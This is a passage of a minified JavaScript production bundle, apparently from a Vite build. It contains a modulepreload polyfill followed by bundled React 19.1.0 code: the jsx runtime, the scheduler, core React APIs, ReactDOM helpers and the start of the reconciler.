(function () {
  const p = document.createElement("link").relList;
  if (p && p.supports && p.supports("modulepreload"))
    return;
  for (const S of document.querySelectorAll('link[rel="modulepreload"]'))
    r(S);
  new MutationObserver(S => {
    for (const R of S)
      if (R.type === "childList")
        for (const A of R.addedNodes)
          A.tagName === "LINK" && A.rel === "modulepreload" && r(A)
  }
  ).observe(document, {
    childList: !0,
    subtree: !0
  });
  function h(S) {
    const R = {};
    return S.integrity && (R.integrity = S.integrity),
      S.referrerPolicy && (R.referrerPolicy = S.referrerPolicy),
      S.crossOrigin === "use-credentials" ? R.credentials = "include" : S.crossOrigin === "anonymous" ? R.credentials = "omit" : R.credentials = "same-origin",
      R
  }
  function r(S) {
    if (S.ep)
      return;
    S.ep = !0;
    const R = h(S);
    fetch(S.href, R)
  }
}
)();
var Js = {
  exports: {}
}
  , vi = {};
var Kd;
function Vp() {
  if (Kd)
    return vi;
  Kd = 1;
  var c = Symbol.for("react.transitional.element")
    , p = Symbol.for("react.fragment");
  function h(r, S, R) {
    var A = null;
    if (R !== void 0 && (A = "" + R),
      S.key !== void 0 && (A = "" + S.key),
      "key" in S) {
      R = {};
      for (var q in S)
        q !== "key" && (R[q] = S[q])
    } else
      R = S;
    return S = R.ref,
    {
      $$typeof: c,
      type: r,
      key: A,
      ref: S !== void 0 ? S : null,
      props: R
    }
  }
  return vi.Fragment = p,
    vi.jsx = h,
    vi.jsxs = h,
    vi
}
var Jd;
function Kp() {
  return Jd || (Jd = 1,
    Js.exports = Vp()),
    Js.exports
}
var g = Kp()
  , $s = {
    exports: {}
  }
  , bi = {}
  , Ws = {
    exports: {}
  }
  , Fs = {};
var $d;
function Jp() {
  return $d || ($d = 1,
    (function (c) {
      function p(T, w) {
        var W = T.length;
        T.push(w);
        t: for (; 0 < W;) {
          var yt = W - 1 >>> 1
            , o = T[yt];
          if (0 < S(o, w))
            T[yt] = w,
              T[W] = o,
              W = yt;
          else
            break t
        }
      }
      function h(T) {
        return T.length === 0 ? null : T[0]
      }
      function r(T) {
        if (T.length === 0)
          return null;
        var w = T[0]
          , W = T.pop();
        if (W !== w) {
          T[0] = W;
          t: for (var yt = 0, o = T.length, O = o >>> 1; yt < O;) {
            var X = 2 * (yt + 1) - 1
              , B = T[X]
              , J = X + 1
              , lt = T[J];
            if (0 > S(B, W))
              J < o && 0 > S(lt, B) ? (T[yt] = lt,
                T[J] = W,
                yt = J) : (T[yt] = B,
                  T[X] = W,
                  yt = X);
            else if (J < o && 0 > S(lt, W))
              T[yt] = lt,
                T[J] = W,
                yt = J;
            else
              break t
          }
        }
        return w
      }
      function S(T, w) {
        var W = T.sortIndex - w.sortIndex;
        return W !== 0 ? W : T.id - w.id
      }
      if (c.unstable_now = void 0,
        typeof performance == "object" && typeof performance.now == "function") {
        var R = performance;
        c.unstable_now = function () {
          return R.now()
        }
      } else {
        var A = Date
          , q = A.now();
        c.unstable_now = function () {
          return A.now() - q
        }
      }
      var k = []
        , y = []
        , C = 1
        , $ = null
        , tt = 3
        , St = !1
        , Yt = !1
        , zt = !1
        , Rt = !1
        , re = typeof setTimeout == "function" ? setTimeout : null
        , Tt = typeof clearTimeout == "function" ? clearTimeout : null
        , Gt = typeof setImmediate < "u" ? setImmediate : null;
      function Zt(T) {
        for (var w = h(y); w !== null;) {
          if (w.callback === null)
            r(y);
          else if (w.startTime <= T)
            r(y),
              w.sortIndex = w.expirationTime,
              p(k, w);
          else
            break;
          w = h(y)
        }
      }
      function ot(T) {
        if (zt = !1,
          Zt(T),
          !Yt)
          if (h(k) !== null)
            Yt = !0,
              Dt || (Dt = !0,
                Qt());
          else {
            var w = h(y);
            w !== null && qt(ot, w.startTime - T)
          }
      }
      var Dt = !1
        , Mt = -1
        , D = 5
        , st = -1;
      function $e() {
        return Rt ? !0 : !(c.unstable_now() - st < D)
      }
      function xe() {
        if (Rt = !1,
          Dt) {
          var T = c.unstable_now();
          st = T;
          var w = !0;
          try {
            t: {
              Yt = !1,
                zt && (zt = !1,
                  Tt(Mt),
                  Mt = -1),
                St = !0;
              var W = tt;
              try {
                e: {
                  for (Zt(T),
                    $ = h(k); $ !== null && !($.expirationTime > T && $e());) {
                    var yt = $.callback;
                    if (typeof yt == "function") {
                      $.callback = null,
                        tt = $.priorityLevel;
                      var o = yt($.expirationTime <= T);
                      if (T = c.unstable_now(),
                        typeof o == "function") {
                        $.callback = o,
                          Zt(T),
                          w = !0;
                        break e
                      }
                      $ === h(k) && r(k),
                        Zt(T)
                    } else
                      r(k);
                    $ = h(k)
                  }
                  if ($ !== null)
                    w = !0;
                  else {
                    var O = h(y);
                    O !== null && qt(ot, O.startTime - T),
                      w = !1
                  }
                }
                break t
              } finally {
                $ = null,
                  tt = W,
                  St = !1
              }
              w = void 0
            }
          } finally {
            w ? Qt() : Dt = !1
          }
        }
      }
      var Qt;
      if (typeof Gt == "function")
        Qt = function () {
          Gt(xe)
        }
          ;
      else if (typeof MessageChannel < "u") {
        var Te = new MessageChannel
          , je = Te.port2;
        Te.port1.onmessage = xe,
          Qt = function () {
            je.postMessage(null)
          }
      } else
        Qt = function () {
          re(xe, 0)
        }
          ;
      function qt(T, w) {
        Mt = re(function () {
          T(c.unstable_now())
        }, w)
      }
      c.unstable_IdlePriority = 5,
        c.unstable_ImmediatePriority = 1,
        c.unstable_LowPriority = 4,
        c.unstable_NormalPriority = 3,
        c.unstable_Profiling = null,
        c.unstable_UserBlockingPriority = 2,
        c.unstable_cancelCallback = function (T) {
          T.callback = null
        }
        ,
        c.unstable_forceFrameRate = function (T) {
          0 > T || 125 < T ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : D = 0 < T ? Math.floor(1e3 / T) : 5
        }
        ,
        c.unstable_getCurrentPriorityLevel = function () {
          return tt
        }
        ,
        c.unstable_next = function (T) {
          switch (tt) {
            case 1:
            case 2:
            case 3:
              var w = 3;
              break;
            default:
              w = tt
          }
          var W = tt;
          tt = w;
          try {
            return T()
          } finally {
            tt = W
          }
        }
        ,
        c.unstable_requestPaint = function () {
          Rt = !0
        }
        ,
        c.unstable_runWithPriority = function (T, w) {
          switch (T) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
              break;
            default:
              T = 3
          }
          var W = tt;
          tt = T;
          try {
            return w()
          } finally {
            tt = W
          }
        }
        ,
        c.unstable_scheduleCallback = function (T, w, W) {
          var yt = c.unstable_now();
          switch (typeof W == "object" && W !== null ? (W = W.delay,
            W = typeof W == "number" && 0 < W ? yt + W : yt) : W = yt,
          T) {
            case 1:
              var o = -1;
              break;
            case 2:
              o = 250;
              break;
            case 5:
              o = 1073741823;
              break;
            case 4:
              o = 1e4;
              break;
            default:
              o = 5e3
          }
          return o = W + o,
            T = {
              id: C++,
              callback: w,
              priorityLevel: T,
              startTime: W,
              expirationTime: o,
              sortIndex: -1
            },
            W > yt ? (T.sortIndex = W,
              p(y, T),
              h(k) === null && T === h(y) && (zt ? (Tt(Mt),
                Mt = -1) : zt = !0,
                qt(ot, W - yt))) : (T.sortIndex = o,
                  p(k, T),
                  Yt || St || (Yt = !0,
                    Dt || (Dt = !0,
                      Qt()))),
            T
        }
        ,
        c.unstable_shouldYield = $e,
        c.unstable_wrapCallback = function (T) {
          var w = tt;
          return function () {
            var W = tt;
            tt = w;
            try {
              return T.apply(this, arguments)
            } finally {
              tt = W
            }
          }
        }
    }
    )(Fs)),
    Fs
}
var Wd;
function $p() {
  return Wd || (Wd = 1,
    Ws.exports = Jp()),
    Ws.exports
}
var Is = {
  exports: {}
}
  , dt = {};
var Fd;
function Wp() {
  if (Fd)
    return dt;
  Fd = 1;
  var c = Symbol.for("react.transitional.element")
    , p = Symbol.for("react.portal")
    , h = Symbol.for("react.fragment")
    , r = Symbol.for("react.strict_mode")
    , S = Symbol.for("react.profiler")
    , R = Symbol.for("react.consumer")
    , A = Symbol.for("react.context")
    , q = Symbol.for("react.forward_ref")
    , k = Symbol.for("react.suspense")
    , y = Symbol.for("react.memo")
    , C = Symbol.for("react.lazy")
    , $ = Symbol.iterator;
  function tt(o) {
    return o === null || typeof o != "object" ? null : (o = $ && o[$] || o["@@iterator"],
      typeof o == "function" ? o : null)
  }
  var St = {
    isMounted: function () {
      return !1
    },
    enqueueForceUpdate: function () { },
    enqueueReplaceState: function () { },
    enqueueSetState: function () { }
  }
    , Yt = Object.assign
    , zt = {};
  function Rt(o, O, X) {
    this.props = o,
      this.context = O,
      this.refs = zt,
      this.updater = X || St
  }
  Rt.prototype.isReactComponent = {},
    Rt.prototype.setState = function (o, O) {
      if (typeof o != "object" && typeof o != "function" && o != null)
        throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
      this.updater.enqueueSetState(this, o, O, "setState")
    }
    ,
    Rt.prototype.forceUpdate = function (o) {
      this.updater.enqueueForceUpdate(this, o, "forceUpdate")
    }
    ;
  function re() { }
  re.prototype = Rt.prototype;
  function Tt(o, O, X) {
    this.props = o,
      this.context = O,
      this.refs = zt,
      this.updater = X || St
  }
  var Gt = Tt.prototype = new re;
  Gt.constructor = Tt,
    Yt(Gt, Rt.prototype),
    Gt.isPureReactComponent = !0;
  var Zt = Array.isArray
    , ot = {
      H: null,
      A: null,
      T: null,
      S: null,
      V: null
    }
    , Dt = Object.prototype.hasOwnProperty;
  function Mt(o, O, X, B, J, lt) {
    return X = lt.ref,
    {
      $$typeof: c,
      type: o,
      key: O,
      ref: X !== void 0 ? X : null,
      props: lt
    }
  }
  function D(o, O) {
    return Mt(o.type, O, void 0, void 0, void 0, o.props)
  }
  function st(o) {
    return typeof o == "object" && o !== null && o.$$typeof === c
  }
  function $e(o) {
    var O = {
      "=": "=0",
      ":": "=2"
    };
    return "$" + o.replace(/[=:]/g, function (X) {
      return O[X]
    })
  }
  var xe = /\/+/g;
  function Qt(o, O) {
    return typeof o == "object" && o !== null && o.key != null ? $e("" + o.key) : O.toString(36)
  }
  function Te() { }
  function je(o) {
    switch (o.status) {
      case "fulfilled":
        return o.value;
      case "rejected":
        throw o.reason;
      default:
        switch (typeof o.status == "string" ? o.then(Te, Te) : (o.status = "pending",
          o.then(function (O) {
            o.status === "pending" && (o.status = "fulfilled",
              o.value = O)
          }, function (O) {
            o.status === "pending" && (o.status = "rejected",
              o.reason = O)
          })),
        o.status) {
          case "fulfilled":
            return o.value;
          case "rejected":
            throw o.reason
        }
    }
    throw o
  }
  function qt(o, O, X, B, J) {
    var lt = typeof o;
    (lt === "undefined" || lt === "boolean") && (o = null);
    var V = !1;
    if (o === null)
      V = !0;
    else
      switch (lt) {
        case "bigint":
        case "string":
        case "number":
          V = !0;
          break;
        case "object":
          switch (o.$$typeof) {
            case c:
            case p:
              V = !0;
              break;
            case C:
              return V = o._init,
                qt(V(o._payload), O, X, B, J)
          }
      }
    if (V)
      return J = J(o),
        V = B === "" ? "." + Qt(o, 0) : B,
        Zt(J) ? (X = "",
          V != null && (X = V.replace(xe, "$&/") + "/"),
          qt(J, O, X, "", function (Ot) {
            return Ot
          })) : J != null && (st(J) && (J = D(J, X + (J.key == null || o && o.key === J.key ? "" : ("" + J.key).replace(xe, "$&/") + "/") + V)),
            O.push(J)),
        1;
    V = 0;
    var Jt = B === "" ? "." : B + ":";
    if (Zt(o))
      for (var _t = 0; _t < o.length; _t++)
        B = o[_t],
          lt = Jt + Qt(B, _t),
          V += qt(B, O, X, lt, J);
    else if (_t = tt(o),
      typeof _t == "function")
      for (o = _t.call(o),
        _t = 0; !(B = o.next()).done;)
        B = B.value,
          lt = Jt + Qt(B, _t++),
          V += qt(B, O, X, lt, J);
    else if (lt === "object") {
      if (typeof o.then == "function")
        return qt(je(o), O, X, B, J);
      throw O = String(o),
      Error("Objects are not valid as a React child (found: " + (O === "[object Object]" ? "object with keys {" + Object.keys(o).join(", ") + "}" : O) + "). If you meant to render a collection of children, use an array instead.")
    }
    return V
  }
  function T(o, O, X) {
    if (o == null)
      return o;
    var B = []
      , J = 0;
    return qt(o, B, "", "", function (lt) {
      return O.call(X, lt, J++)
    }),
      B
  }
  function w(o) {
    if (o._status === -1) {
      var O = o._result;
      O = O(),
        O.then(function (X) {
          (o._status === 0 || o._status === -1) && (o._status = 1,
            o._result = X)
        }, function (X) {
          (o._status === 0 || o._status === -1) && (o._status = 2,
            o._result = X)
        }),
        o._status === -1 && (o._status = 0,
          o._result = O)
    }
    if (o._status === 1)
      return o._result.default;
    throw o._result
  }
  var W = typeof reportError == "function" ? reportError : function (o) {
    if (typeof window == "object" && typeof window.ErrorEvent == "function") {
      var O = new window.ErrorEvent("error", {
        bubbles: !0,
        cancelable: !0,
        message: typeof o == "object" && o !== null && typeof o.message == "string" ? String(o.message) : String(o),
        error: o
      });
      if (!window.dispatchEvent(O))
        return
    } else if (typeof process == "object" && typeof process.emit == "function") {
      process.emit("uncaughtException", o);
      return
    }
    console.error(o)
  }
    ;
  function yt() { }
  return dt.Children = {
    map: T,
    forEach: function (o, O, X) {
      T(o, function () {
        O.apply(this, arguments)
      }, X)
    },
    count: function (o) {
      var O = 0;
      return T(o, function () {
        O++
      }),
        O
    },
    toArray: function (o) {
      return T(o, function (O) {
        return O
      }) || []
    },
    only: function (o) {
      if (!st(o))
        throw Error("React.Children.only expected to receive a single React element child.");
      return o
    }
  },
    dt.Component = Rt,
    dt.Fragment = h,
    dt.Profiler = S,
    dt.PureComponent = Tt,
    dt.StrictMode = r,
    dt.Suspense = k,
    dt.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = ot,
    dt.__COMPILER_RUNTIME = {
      __proto__: null,
      c: function (o) {
        return ot.H.useMemoCache(o)
      }
    },
    dt.cache = function (o) {
      return function () {
        return o.apply(null, arguments)
      }
    }
    ,
    dt.cloneElement = function (o, O, X) {
      if (o == null)
        throw Error("The argument must be a React element, but you passed " + o + ".");
      var B = Yt({}, o.props)
        , J = o.key
        , lt = void 0;
      if (O != null)
        for (V in O.ref !== void 0 && (lt = void 0),
          O.key !== void 0 && (J = "" + O.key),
          O)
          !Dt.call(O, V) || V === "key" || V === "__self" || V === "__source" || V === "ref" && O.ref === void 0 || (B[V] = O[V]);
      var V = arguments.length - 2;
      if (V === 1)
        B.children = X;
      else if (1 < V) {
        for (var Jt = Array(V), _t = 0; _t < V; _t++)
          Jt[_t] = arguments[_t + 2];
        B.children = Jt
      }
      return Mt(o.type, J, void 0, void 0, lt, B)
    }
    ,
    dt.createContext = function (o) {
      return o = {
        $$typeof: A,
        _currentValue: o,
        _currentValue2: o,
        _threadCount: 0,
        Provider: null,
        Consumer: null
      },
        o.Provider = o,
        o.Consumer = {
          $$typeof: R,
          _context: o
        },
        o
    }
    ,
    dt.createElement = function (o, O, X) {
      var B, J = {}, lt = null;
      if (O != null)
        for (B in O.key !== void 0 && (lt = "" + O.key),
          O)
          Dt.call(O, B) && B !== "key" && B !== "__self" && B !== "__source" && (J[B] = O[B]);
      var V = arguments.length - 2;
      if (V === 1)
        J.children = X;
      else if (1 < V) {
        for (var Jt = Array(V), _t = 0; _t < V; _t++)
          Jt[_t] = arguments[_t + 2];
        J.children = Jt
      }
      if (o && o.defaultProps)
        for (B in V = o.defaultProps,
          V)
          J[B] === void 0 && (J[B] = V[B]);
      return Mt(o, lt, void 0, void 0, null, J)
    }
    ,
    dt.createRef = function () {
      return {
        current: null
      }
    }
    ,
    dt.forwardRef = function (o) {
      return {
        $$typeof: q,
        render: o
      }
    }
    ,
    dt.isValidElement = st,
    dt.lazy = function (o) {
      return {
        $$typeof: C,
        _payload: {
          _status: -1,
          _result: o
        },
        _init: w
      }
    }
    ,
    dt.memo = function (o, O) {
      return {
        $$typeof: y,
        type: o,
        compare: O === void 0 ? null : O
      }
    }
    ,
    dt.startTransition = function (o) {
      var O = ot.T
        , X = {};
      ot.T = X;
      try {
        var B = o()
          , J = ot.S;
        J !== null && J(X, B),
          typeof B == "object" && B !== null && typeof B.then == "function" && B.then(yt, W)
      } catch (lt) {
        W(lt)
      } finally {
        ot.T = O
      }
    }
    ,
    dt.unstable_useCacheRefresh = function () {
      return ot.H.useCacheRefresh()
    }
    ,
    dt.use = function (o) {
      return ot.H.use(o)
    }
    ,
    dt.useActionState = function (o, O, X) {
      return ot.H.useActionState(o, O, X)
    }
    ,
    dt.useCallback = function (o, O) {
      return ot.H.useCallback(o, O)
    }
    ,
    dt.useContext = function (o) {
      return ot.H.useContext(o)
    }
    ,
    dt.useDebugValue = function () { }
    ,
    dt.useDeferredValue = function (o, O) {
      return ot.H.useDeferredValue(o, O)
    }
    ,
    dt.useEffect = function (o, O, X) {
      var B = ot.H;
      if (typeof X == "function")
        throw Error("useEffect CRUD overload is not enabled in this build of React.");
      return B.useEffect(o, O)
    }
    ,
    dt.useId = function () {
      return ot.H.useId()
    }
    ,
    dt.useImperativeHandle = function (o, O, X) {
      return ot.H.useImperativeHandle(o, O, X)
    }
    ,
    dt.useInsertionEffect = function (o, O) {
      return ot.H.useInsertionEffect(o, O)
    }
    ,
    dt.useLayoutEffect = function (o, O) {
      return ot.H.useLayoutEffect(o, O)
    }
    ,
    dt.useMemo = function (o, O) {
      return ot.H.useMemo(o, O)
    }
    ,
    dt.useOptimistic = function (o, O) {
      return ot.H.useOptimistic(o, O)
    }
    ,
    dt.useReducer = function (o, O, X) {
      return ot.H.useReducer(o, O, X)
    }
    ,
    dt.useRef = function (o) {
      return ot.H.useRef(o)
    }
    ,
    dt.useState = function (o) {
      return ot.H.useState(o)
    }
    ,
    dt.useSyncExternalStore = function (o, O, X) {
      return ot.H.useSyncExternalStore(o, O, X)
    }
    ,
    dt.useTransition = function () {
      return ot.H.useTransition()
    }
    ,
    dt.version = "19.1.0",
    dt
}
var Id;
function or() {
  return Id || (Id = 1,
    Is.exports = Wp()),
    Is.exports
}
var Ps = {
  exports: {}
}
  , be = {};
var Pd;
function Fp() {
  if (Pd)
    return be;
  Pd = 1;
  var c = or();
  function p(k) {
    var y = "https://react.dev/errors/" + k;
    if (1 < arguments.length) {
      y += "?args[]=" + encodeURIComponent(arguments[1]);
      for (var C = 2; C < arguments.length; C++)
        y += "&args[]=" + encodeURIComponent(arguments[C])
    }
    return "Minified React error #" + k + "; visit " + y + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
  }
  function h() { }
  var r = {
    d: {
      f: h,
      r: function () {
        throw Error(p(522))
      },
      D: h,
      C: h,
      L: h,
      m: h,
      X: h,
      S: h,
      M: h
    },
    p: 0,
    findDOMNode: null
  }
    , S = Symbol.for("react.portal");
  function R(k, y, C) {
    var $ = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
      $$typeof: S,
      key: $ == null ? null : "" + $,
      children: k,
      containerInfo: y,
      implementation: C
    }
  }
  var A = c.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
  function q(k, y) {
    if (k === "font")
      return "";
    if (typeof y == "string")
      return y === "use-credentials" ? y : ""
  }
  return be.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = r,
    be.createPortal = function (k, y) {
      var C = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
      if (!y || y.nodeType !== 1 && y.nodeType !== 9 && y.nodeType !== 11)
        throw Error(p(299));
      return R(k, y, null, C)
    }
    ,
    be.flushSync = function (k) {
      var y = A.T
        , C = r.p;
      try {
        if (A.T = null,
          r.p = 2,
          k)
          return k()
      } finally {
        A.T = y,
          r.p = C,
          r.d.f()
      }
    }
    ,
    be.preconnect = function (k, y) {
      typeof k == "string" && (y ? (y = y.crossOrigin,
        y = typeof y == "string" ? y === "use-credentials" ? y : "" : void 0) : y = null,
        r.d.C(k, y))
    }
    ,
    be.prefetchDNS = function (k) {
      typeof k == "string" && r.d.D(k)
    }
    ,
    be.preinit = function (k, y) {
      if (typeof k == "string" && y && typeof y.as == "string") {
        var C = y.as
          , $ = q(C, y.crossOrigin)
          , tt = typeof y.integrity == "string" ? y.integrity : void 0
          , St = typeof y.fetchPriority == "string" ? y.fetchPriority : void 0;
        C === "style" ? r.d.S(k, typeof y.precedence == "string" ? y.precedence : void 0, {
          crossOrigin: $,
          integrity: tt,
          fetchPriority: St
        }) : C === "script" && r.d.X(k, {
          crossOrigin: $,
          integrity: tt,
          fetchPriority: St,
          nonce: typeof y.nonce == "string" ? y.nonce : void 0
        })
      }
    }
    ,
    be.preinitModule = function (k, y) {
      if (typeof k == "string")
        if (typeof y == "object" && y !== null) {
          if (y.as == null || y.as === "script") {
            var C = q(y.as, y.crossOrigin);
            r.d.M(k, {
              crossOrigin: C,
              integrity: typeof y.integrity == "string" ? y.integrity : void 0,
              nonce: typeof y.nonce == "string" ? y.nonce : void 0
            })
          }
        } else
          y == null && r.d.M(k)
    }
    ,
    be.preload = function (k, y) {
      if (typeof k == "string" && typeof y == "object" && y !== null && typeof y.as == "string") {
        var C = y.as
          , $ = q(C, y.crossOrigin);
        r.d.L(k, C, {
          crossOrigin: $,
          integrity: typeof y.integrity == "string" ? y.integrity : void 0,
          nonce: typeof y.nonce == "string" ? y.nonce : void 0,
          type: typeof y.type == "string" ? y.type : void 0,
          fetchPriority: typeof y.fetchPriority == "string" ? y.fetchPriority : void 0,
          referrerPolicy: typeof y.referrerPolicy == "string" ? y.referrerPolicy : void 0,
          imageSrcSet: typeof y.imageSrcSet == "string" ? y.imageSrcSet : void 0,
          imageSizes: typeof y.imageSizes == "string" ? y.imageSizes : void 0,
          media: typeof y.media == "string" ? y.media : void 0
        })
      }
    }
    ,
    be.preloadModule = function (k, y) {
      if (typeof k == "string")
        if (y) {
          var C = q(y.as, y.crossOrigin);
          r.d.m(k, {
            as: typeof y.as == "string" && y.as !== "script" ? y.as : void 0,
            crossOrigin: C,
            integrity: typeof y.integrity == "string" ? y.integrity : void 0
          })
        } else
          r.d.m(k)
    }
    ,
    be.requestFormReset = function (k) {
      r.d.r(k)
    }
    ,
    be.unstable_batchedUpdates = function (k, y) {
      return k(y)
    }
    ,
    be.useFormState = function (k, y, C) {
      return A.H.useFormState(k, y, C)
    }
    ,
    be.useFormStatus = function () {
      return A.H.useHostTransitionStatus()
    }
    ,
    be.version = "19.1.0",
    be
}
var t0;
function Ip() {
  if (t0)
    return Ps.exports;
  t0 = 1;
  function c() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
      try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c)
      } catch (p) {
        console.error(p)
      }
  }
  return c(),
    Ps.exports = Fp(),
    Ps.exports
}
var e0;
function Pp() {
  if (e0)
    return bi;
  e0 = 1;
  var c = $p()
    , p = or()
    , h = Ip();
  function r(t) {
    var e = "https://react.dev/errors/" + t;
    if (1 < arguments.length) {
      e += "?args[]=" + encodeURIComponent(arguments[1]);
      for (var l = 2; l < arguments.length; l++)
        e += "&args[]=" + encodeURIComponent(arguments[l])
    }
    return "Minified React error #" + t + "; visit " + e + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
  }
  function S(t) {
    return !(!t || t.nodeType !== 1 && t.nodeType !== 9 && t.nodeType !== 11)
  }
  function R(t) {
    var e = t
      , l = t;
    if (t.alternate)
      for (; e.return;)
        e = e.return;
    else {
      t = e;
      do
        e = t,
          (e.flags & 4098) !== 0 && (l = e.return),
          t = e.return;
      while (t)
    }
    return e.tag === 3 ? l : null
  }
  function A(t) {
    if (t.tag === 13) {
      var e = t.memoizedState;
      if (e === null && (t = t.alternate,
        t !== null && (e = t.memoizedState)),
        e !== null)
        return e.dehydrated
    }
    return null
  }
  function q(t) {
    if (R(t) !== t)
      throw Error(r(188))
  }
  function k(t) {
    var e = t.alternate;
    if (!e) {
      if (e = R(t),
        e === null)
        throw Error(r(188));
      return e !== t ? null : t
    }
    for (var l = t, a = e; ;) {
      var n = l.return;
      if (n === null)
        break;
      var i = n.alternate;
      if (i === null) {
        if (a = n.return,
          a !== null) {
          l = a;
          continue
        }
        break
      }
      if (n.child === i.child) {
        for (i = n.child; i;) {
          if (i === l)
            return q(n),
              t;
          if (i === a)
            return q(n),
              e;
          i = i.sibling
        }
        throw Error(r(188))
      }
      if (l.return !== a.return)
        l = n,
          a = i;
      else {
        for (var u = !1, s = n.child; s;) {
          if (s === l) {
            u = !0,
              l = n,
              a = i;
            break
          }
          if (s === a) {
            u = !0,
              a = n,
              l = i;
            break
          }
          s = s.sibling
        }
        if (!u) {
          for (s = i.child; s;) {
            if (s === l) {
              u = !0,
                l = i,
                a = n;
              break
            }
            if (s === a) {
              u = !0,
                a = i,
                l = n;
              break
            }
            s = s.sibling
          }
          if (!u)
            throw Error(r(189))
        }
      }
      if (l.alternate !== a)
        throw Error(r(190))
    }
    if (l.tag !== 3)
      throw Error(r(188));
    return l.stateNode.current === l ? t : e
  }
  function y(t) {
    var e = t.tag;
    if (e === 5 || e === 26 || e === 27 || e === 6)
      return t;
    for (t = t.child; t !== null;) {
      if (e = y(t),
        e !== null)
        return e;
      t = t.sibling
    }
    return null
  }
  var C = Object.assign
    , $ = Symbol.for("react.element")
    , tt = Symbol.for("react.transitional.element")
    , St = Symbol.for("react.portal")
    , Yt = Symbol.for("react.fragment")
    , zt = Symbol.for("react.strict_mode")
    , Rt = Symbol.for("react.profiler")
    , re = Symbol.for("react.provider")
    , Tt = Symbol.for("react.consumer")
    , Gt = Symbol.for("react.context")
    , Zt = Symbol.for("react.forward_ref")
    , ot = Symbol.for("react.suspense")
    , Dt = Symbol.for("react.suspense_list")
    , Mt = Symbol.for("react.memo")
    , D = Symbol.for("react.lazy")
    , st = Symbol.for("react.activity")
    , $e = Symbol.for("react.memo_cache_sentinel")
    , xe = Symbol.iterator;
  function Qt(t) {
    return t === null || typeof t != "object" ? null : (t = xe && t[xe] || t["@@iterator"],
      typeof t == "function" ? t : null)
  }
  var Te = Symbol.for("react.client.reference");
  function je(t) {
    if (t == null)
      return null;
    if (typeof t == "function")
      return t.$$typeof === Te ? null : t.displayName || t.name || null;
    if (typeof t == "string")
      return t;
    switch (t) {
      case Yt:
        return "Fragment";
      case Rt:
        return "Profiler";
      case zt:
        return "StrictMode";
      case ot:
        return "Suspense";
      case Dt:
        return "SuspenseList";
      case st:
        return "Activity"
    }
    if (typeof t == "object")
      switch (t.$$typeof) {
        case St:
          return "Portal";
        case Gt:
          return (t.displayName || "Context") + ".Provider";
        case Tt:
          return (t._context.displayName || "Context") + ".Consumer";
        case Zt:
          var e = t.render;
          return t = t.displayName,
            t || (t = e.displayName || e.name || "",
              t = t !== "" ? "ForwardRef(" + t + ")" : "ForwardRef"),
            t;
        case Mt:
          return e = t.displayName || null,
            e !== null ? e : je(t.type) || "Memo";
        case D:
          e = t._payload,
            t = t._init;
          try {
            return je(t(e))
          } catch { }
      }
    return null
  }
  var qt = Array.isArray
    , T = p.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
    , w = h.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
    , W = {
      pending: !1,
      data: null,
      method: null,
      action: null
    }
    , yt = []
    , o = -1;
  function O(t) {
    return {
      current: t
    }
  }
  function X(t) {
    0 > o || (t.current = yt[o],
      yt[o] = null,
      o--)
  }
  function B(t, e) {
    o++,
      yt[o] = t.current,
      t.current = e
  }
  var J = O(null)
    , lt = O(null)
    , V = O(null)
    , Jt = O(null);
  function _t(t, e) {
    switch (B(V, e),
    B(lt, t),
    B(J, null),
    e.nodeType) {
      case 9:
      case 11:
        t = (t = e.documentElement) && (t = t.namespaceURI) ? Sd(t) : 0;
        break;
      default:
        if (t = e.tagName,
          e = e.namespaceURI)
          e = Sd(e),
            t = zd(e, t);
        else
          switch (t) {
            case "svg":
              t = 1;
              break;
            case "math":
              t = 2;
              break;
            default:
              t = 0
          }
    }
    X(J),
      B(J, t)
  }
  function Ot() {
    X(J),
      X(lt),
      X(V)
  }
  function hl(t) {
    t.memoizedState !== null && B(Jt, t);
    var e = J.current
      , l = zd(e, t.type);
    e !== l && (B(lt, t),
      B(J, l))
  }
  function _e(t) {
    lt.current === t && (X(J),
      X(lt)),
      Jt.current === t && (X(Jt),
        di._currentValue = W)
  }
  var ll = Object.prototype.hasOwnProperty
    , Q = c.unstable_scheduleCallback
    , Se = c.unstable_cancelCallback
    , We = c.unstable_shouldYield
    , xn = c.unstable_requestPaint
    , Ee = c.unstable_now
    , Ca = c.unstable_getCurrentPriorityLevel
    , gl = c.unstable_ImmediatePriority
    , al = c.unstable_UserBlockingPriority
    , Fe = c.unstable_NormalPriority
    , oe = c.unstable_LowPriority
    , Ua = c.unstable_IdlePriority
    , rt = c.log
    , nl = c.unstable_setDisableYieldValue
    , vl = null
    , ze = null;
  function il(t) {
    if (typeof rt == "function" && nl(t),
      ze && typeof ze.setStrictMode == "function")
      try {
        ze.setStrictMode(vl, t)
      } catch { }
  }
  var fe = Math.clz32 ? Math.clz32 : Gu
    , Bu = Math.log
    , Yu = Math.LN2;
  function Gu(t) {
    return t >>>= 0,
      t === 0 ? 32 : 31 - (Bu(t) / Yu | 0) | 0
  }
  var wa = 256
    , Ha = 4194304;
  function ul(t) {
    var e = t & 42;
    if (e !== 0)
      return e;
    switch (t & -t) {
      case 1:
        return 1;
      case 2:
        return 2;
      case 4:
        return 4;
      case 8:
        return 8;
      case 16:
        return 16;
      case 32:
        return 32;
      case 64:
        return 64;
      case 128:
        return 128;
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
        return t & 4194048;
